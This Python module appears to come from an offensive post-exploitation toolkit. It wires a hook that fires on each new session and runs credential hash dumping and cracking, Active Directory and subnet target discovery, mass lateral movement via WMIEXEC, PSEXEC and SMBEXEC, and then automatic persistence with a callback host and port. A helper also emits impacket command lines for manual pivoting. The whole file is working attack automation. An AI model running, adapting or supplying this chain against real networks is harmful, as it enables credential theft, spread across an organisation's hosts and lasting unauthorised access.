"""
Lateral Movement Session Hook Integration
Integrates with CrackSession and HashDump for automated pivoting
"""

from cybermodules.lateral_movement import LateralMovementEngine, LateralMethod
from cybermodules.hashdump import HashDumpEngine
from cybermodules.persistence import PersistenceEngine, OSType


class LateralSessionHook:
    """
    Manages automated lateral movement after session acquisition
    """
    
    def __init__(self, scan_id):
        self.scan_id = scan_id
        self.lateral_engine = None
        self.persistence_engine = None
        self.hashdump_engine = None
    
    def on_session_opened(self, session_info):
        """
        Called when a new session is established
        Automatically executes: hashdump -> lateral movement -> persistence
        """
        results = {
            'session': session_info,
            'hashdump': None,
            'lateral': None,
            'persistence': None,
            'errors': []
        }
        
        target = session_info.get("target")
        username = session_info.get("username")
        password = session_info.get("password")
        domain = session_info.get("domain", "")
        lhost = session_info.get("lhost", "")
        lport = session_info.get("lport", 4444)
        
        # Step 1: Run hashdump (if credentials provided)
        if username and password:
            try:
                self.hashdump_engine = HashDumpEngine(self.scan_id, session_info)
                hash_result = self.hashdump_engine.execute_session_hook()
                results['hashdump'] = {
                    'success': hash_result.get('success', False),
                    'cracked_count': hash_result.get('total_cracked', 0),
                    'hash_count': len(hash_result.get('extraction', {}).get('hashes', []))
                }
            except Exception as e:
                results['errors'].append(f"Hashdump error: {str(e)}")
        
        # Step 2: Auto lateral movement
        try:
            self.lateral_engine = LateralMovementEngine(self.scan_id, session_info)
            
            # Get targets from AD enum
            ad_targets = self.lateral_engine.get_targets_from_ad_enum()
            
            # Add discovered targets
            if session_info.get("network_subnet"):
                self.lateral_engine.discover_network_targets(session_info["network_subnet"])
            
            # Combine targets
            all_targets = ad_targets + self.lateral_engine.targets
            
            # Remove duplicates
            seen = set()
            unique_targets = []
            for t in all_targets:
                key = t.get('hostname') or t.get('ip')
                if key and key not in seen:
                    seen.add(key)
                    unique_targets.append(t)
            
            self.lateral_engine.targets = unique_targets
            
            # Prepare credentials
            credentials = self.lateral_engine.prepare_credentials()
            
            # Execute lateral movement
            if unique_targets and credentials:
                lateral_results = self.lateral_engine.execute_mass_movement(
                    targets=unique_targets,
                    credentials=credentials,
                    methods=[LateralMethod.WMIEXEC, LateralMethod.PSEXEC, LateralMethod.SMBEXEC]
                )
                
                # Extract successful accesses
                successful_accesses = [r for r in lateral_results if r.get('success')]
                
                results['lateral'] = {
                    'success': len(successful_accesses) > 0,
                    'targets_scanned': len(unique_targets),
                    'successful_moves': len(successful_accesses),
                    'new_sessions': [r.get('session_info') for r in successful_accesses]
                }
                
                # Save results
                self.lateral_engine.save_results_to_db()
                
        except Exception as e:
            results['errors'].append(f"Lateral movement error: {str(e)}")
        
        # Step 3: Install persistence on successful hosts
        try:
            if results.get('lateral', {}).get('success'):
                self.persistence_engine = PersistenceEngine(self.scan_id, session_info)
                self.persistence_engine.set_connection_info(lhost, lport)
                
                # Install on all successful targets
                new_sessions = results['lateral'].get('new_sessions', [])
                for session in new_sessions:
                    if session:
                        self.persistence_engine.session_info.update(session)
                
                # Auto-install persistence
                persist_results = self.persistence_engine.install_all()
                
                results['persistence'] = {
                    'success': len(persist_results) > 0,
                    'methods_installed': [p.get('method') for p in persist_results],
                    'commands': self.persistence_engine.get_commands()
                }
                
        except Exception as e:
            results['errors'].append(f"Persistence error: {str(e)}")
        
        return results
    
    def get_lateral_commands(self, session_info):
        """
        Get lateral movement commands for manual execution
        """
        engine = LateralMovementEngine(self.scan_id, session_info)
        targets = engine.get_targets_from_ad_enum()
        credentials = engine.prepare_credentials()
        
        commands = []
        
        for target in targets[:10]:  # Limit to 10 targets
            for cred in credentials:
                for method in [LateralMethod.WMIEXEC, LateralMethod.PSEXEC]:
                    cmd = engine._build_impacket_command(method, target, cred)
                    commands.append(' '.join(cmd))
        
        return commands[:20]  # Return first 20 commands


def execute_lateral_chain(scan_id, session_info):
    """
    Execute complete lateral movement chain
    """
    hook = LateralSessionHook(scan_id)
    return hook.on_session_opened(session_info)